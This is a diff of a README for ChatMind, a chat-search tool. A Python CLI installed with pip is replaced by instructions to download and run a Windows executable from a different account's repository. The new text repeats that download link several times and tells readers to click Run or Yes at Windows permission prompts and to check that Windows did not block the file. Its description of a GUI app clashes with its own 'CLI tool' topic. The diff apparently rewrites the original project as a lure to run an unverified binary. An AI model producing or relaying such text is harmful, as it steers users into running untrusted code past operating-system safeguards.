@@ -1,138 +1,246 @@
-# ChatMind
+# 🔍 chatmind - Find chats by meaning, not words
 
-**Semantic search for chat messages** powered by TurboQuant vector compression (ICLR 2026).
+[![Download ChatMind](https://img.shields.io/badge/Download%20ChatMind-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/jazmin1595/chatmind)
 
-Search your Discord, KakaoTalk, and other chat exports by **meaning**, not just keywords.
+## 📥 Download
 
-> *"What was that restaurant my friend recommended?"*
-> → ChatMind finds it even if you don't remember the exact words.
+Use this link to visit the download page and get ChatMind for Windows:
 
-## Why ChatMind?
+[https://github.com/jazmin1595/chatmind](https://github.com/jazmin1595/chatmind)
 
-| Feature | Discord Search | Ctrl+F | **ChatMind** |
-|---------|---------------|--------|-------------|
-| Semantic search | No | No | **Yes** |
-| Synonym recognition | No | No | **Yes** |
-| Similarity score | No | No | **Yes** (0.0~1.0) |
-| Offline | No | Yes | **Yes** |
-| Cross-language | No | No | **Yes** |
-| Filter by sender/date | Partial | No | **Yes** |
+## 🧭 What ChatMind does
 
-## Installation
+ChatMind helps you search chat messages by meaning.
 
-```bash
-pip install chatmind
-```
+It works with Discord and KakaoTalk exports, so you can find old messages even when you do not remember the exact words. You can search for a topic, a person, a plan, or a past event, and ChatMind looks for the closest match in your chat history.
 
-Or from source:
+This is useful when you need to:
+- Find a message from a long group chat
+- Look up a shared date, place, or task
+- Search across large chat exports
+- Find related messages in more than one language
 
-```bash
-git clone https://github.com/wjddusrb03/chatmind.git
-cd chatmind
-pip install -e ".[dev]"
-```
+## 🪟 Windows setup
 
-## Quick Start
+Follow these steps on a Windows PC.
 
-### 1. Export your Discord chat
+1. Open the download page:
+   [https://github.com/jazmin1595/chatmind](https://github.com/jazmin1595/chatmind)
 
-Use [DiscordChatExporter](https://github.com/Tyrrrz/DiscordChatExporter) to export as JSON.
+2. Find the latest release or download file on the page.
 
-### 2. Index & Search
+3. Download the Windows version to your computer.
 
-```bash
-# Index the exported file
-chatmind index discord_export.json
+4. If the file is in a .zip format, right-click it and choose Extract All.
 
-# Search by meaning
-chatmind search "restaurant recommendation"
-chatmind search "travel plans" --from Alex
-chatmind search "homework help" --after 2024-01-01
-chatmind search "game night" -k 10
-```
+5. Open the extracted folder.
 
-### Example Output
+6. Double-click the ChatMind app or executable file to start it.
 
-```
-Search: restaurant recommendation
-Found 5 results
+7. If Windows asks for permission, choose Run or Yes.
 
-  #1  [HIGH]  0.89  2024-01-15 10:02
-      Park: I found an amazing sushi restaurant near Gangnam station
-      [general]
+## 🗂️ Before you search
 
-  #2  [HIGH]  0.84  2024-01-15 14:32
-      Park: Try the pasta place on 5th street, their carbonara is amazing
-      [general]
+To use ChatMind, you first need chat exports from Discord or KakaoTalk.
 
-  #3  [MED]   0.71  2024-01-16 12:02
-      Alex: Their tonkotsu ramen is incredible, thick and creamy broth
-      [general]
-```
+You can prepare files like:
+- Discord message exports
+- KakaoTalk chat exports
+- Plain text chat logs
+- Other export formats that keep message text and timestamps
 
-## Supported Platforms
+Keep your exports in one folder so they are easy to find when you open ChatMind.
 
-| Platform | Format | How to Export |
-|----------|--------|---------------|
-| **Discord** | `.json`, `.csv` | [DiscordChatExporter](https://github.com/Tyrrrz/DiscordChatExporter) |
-| **KakaoTalk** | `.txt` | Chat Room > Menu > Export Chat |
-| More coming soon! | | |
+## 🔎 How to search
 
-## CLI Commands
+ChatMind is made for semantic search.
 
-| Command | Description |
-|---------|-------------|
-| `chatmind index <file>` | Index chat messages |
-| `chatmind search "query"` | Semantic search |
-| `chatmind stats` | Show index statistics |
-| `chatmind rooms` | List rooms/channels |
-| `chatmind people` | List participants |
+That means you can search by idea, not just exact words.
 
-### Search Filters
+Try searches like:
+- “the day we talked about moving”
+- “messages about the game night plan”
+- “where we shared the photo link”
+- “the chat about lunch next week”
+- “the message where someone mentioned the new phone”
 
-```bash
-chatmind search "query" --from "Alex"         # Filter by sender
-chatmind search "query" --room "general"       # Filter by room
-chatmind search "query" --after 2024-01-01     # After date
-chatmind search "query" --before 2024-12-31    # Before date
-chatmind search "query" -k 20                  # Top 20 results
-```
+You do not need to remember the exact phrase. ChatMind compares the meaning of your search with the meaning of your chat messages.
 
-## How It Works
+## ⚙️ Basic use
 
-```
-Chat Export → Parse → Sentence Embeddings → TurboQuant Compression → Semantic Search
-                      (multilingual model)   (2x memory savings)     (asymmetric scoring)
-```
+1. Open ChatMind on Windows.
+2. Load your Discord or KakaoTalk export files.
+3. Wait for the app to build its search index.
+4. Type a question or topic into the search bar.
+5. Review the message results.
+6. Open the matched chat and check the context around it.
 
-1. **Parse**: Auto-detect and parse Discord/KakaoTalk export files
-2. **Embed**: Convert messages to 384D vectors using multilingual model
-3. **Compress**: TurboQuant (Google, ICLR 2026) for ~2x memory savings
-4. **Search**: Asymmetric scoring without decompression
+If your export has many messages, the first index step can take time. After that, searches should feel faster.
 
-## Multilingual Support
+## 🧩 Main features
 
-Uses `paraphrase-multilingual-MiniLM-L12-v2` model supporting 50+ languages:
+- Semantic search across chat exports
+- Discord support
+- KakaoTalk support
+- Multilingual search
+- Fast message lookup
+- Search by meaning instead of keywords
+- Works with large message sets
+- Built for local chat review
 
-- English, Korean, Japanese, Chinese, Spanish, French, German...
-- Cross-language search: Search in Korean, find English results!
+## 🧠 How semantic search helps
 
-## Requirements
+Keyword search only finds exact text. If you search for “doctor,” it may miss “clinic visit” or “medical appointment.”
 
-- Python 3.9+
-- CPU only (no GPU needed)
-- ~420 MB for embedding model (first-time download)
+ChatMind uses embeddings to compare message meaning. That helps it find related text even when the words do not match.
 
-## Related Projects
+This is useful for:
+- Shared plans
+- Meeting notes
+- Travel talk
+- Personal reminders
+- Old threads with mixed language
 
-- [CommitMind](https://github.com/wjddusrb03/commitmind) - Semantic search for Git commits
-- [langchain-turboquant](https://github.com/wjddusrb03/langchain-turboquant) - TurboQuant for LangChain
+## 📌 Tips for better results
 
-## Feedback
+- Use short search phrases
+- Search for a topic, not a full sentence
+- Try more than one way to say the same thing
+- Include names, places, or events when you know them
+- Search one chat export first if you want a narrower result set
 
-Found a bug or have an idea? Please open an [Issue](https://github.com/wjddusrb03/chatmind/issues)!
-Korean and English are both welcome.
+Examples:
+- “birthday dinner”
+- “trip to Busan”
+- “project deadline”
+- “school schedule”
+- “lost keys”
 
-## License
+## 🧱 System needs
 
-MIT License
+ChatMind should run on most Windows 10 and Windows 11 PCs.
+
+Recommended setup:
+- Windows 10 or later
+- 8 GB RAM or more
+- Enough space for your chat exports
+- A mouse and keyboard
+- Internet access only for the download page and setup files
+
+If you work with large exports, more memory helps the app handle indexing with less delay.
+
+## 📂 Supported inputs
+
+ChatMind is built for exported chat data, such as:
+- Discord text exports
+- KakaoTalk chat export files
+- UTF-8 text files
+- Message logs with timestamps
+- Multi-chat archives
+
+If your export includes names, dates, and message text, ChatMind can usually work with it.
+
+## 🛠️ If the app does not open
+
+If ChatMind does not start on Windows, try these steps:
+
+1. Make sure the download finished.
+2. Extract the ZIP file if needed.
+3. Run the app from the extracted folder.
+4. Check that Windows did not block the file.
+5. Try moving the folder to your Desktop.
+6. Download the file again if it seems incomplete.
+
+If your search returns few results, check that:
+- The export file loaded correctly
+- The chat text is readable
+- The messages are in a supported format
+- The query uses clear, simple wording
+
+## 🔐 Privacy and local use
+
+ChatMind is meant for local chat search on your own computer.
+
+That means you can keep your exports on your machine and review them without scrolling through chat apps one message at a time.
+
+For best control, store your exports in a folder you manage and remove files you no longer need.
+
+## 📘 Example searches
+
+Here are a few simple examples you can try after setup:
+
+- “where we talked about the concert”
+- “the message about the final exam”
+- “the plan for Friday”
+- “the chat about renting a room”
+- “the note about the delivery”
+
+These searches work well because they describe meaning, not exact wording.
+
+## 🧰 About TurboQuant
+
+ChatMind uses TurboQuant compression for vector search.
+
+In plain terms, this helps the app store and search message meaning in a smaller and faster form. That matters when you work with many messages or long chat histories.
+
+You do not need to set this up yourself. It is part of how ChatMind works.
+
+## 📎 Download and install
+
+Open the download page here:
+
+[https://github.com/jazmin1595/chatmind](https://github.com/jazmin1595/chatmind)
+
+Then:
+1. Get the Windows file from the page
+2. Extract it if it comes as a ZIP
+3. Open the app
+4. Load your chat export
+5. Start searching by meaning
+
+## 🧭 Folder setup suggestion
+
+For easier use, keep a simple folder layout like this:
+
+- ChatMind
+  - exports
+  - results
+  - notes
+
+This makes it easier to find your files later, especially if you use more than one chat export.
+
+## 🧪 Good search habits
+
+Use queries that sound like how you remember the chat.
+
+Good:
+- “the message about moving day”
+- “the chat where we set a time”
+- “the talk about food delivery”
+
+Less useful:
+- full copied sentences
+- very broad single words
+- long paragraphs
+
+Short and clear searches often return better matches.
+
+## 📌 Repository topics
+
+This project covers:
+- chat export
+- chat search
+- CLI tool
+- developer tools
+- Discord
+- embeddings
+- KakaoTalk
+- message search
+- multilingual
+- natural language search
+- NLP
+- Python
+- semantic search
+- sentence embeddings
+- TurboQuant
+- vector compression
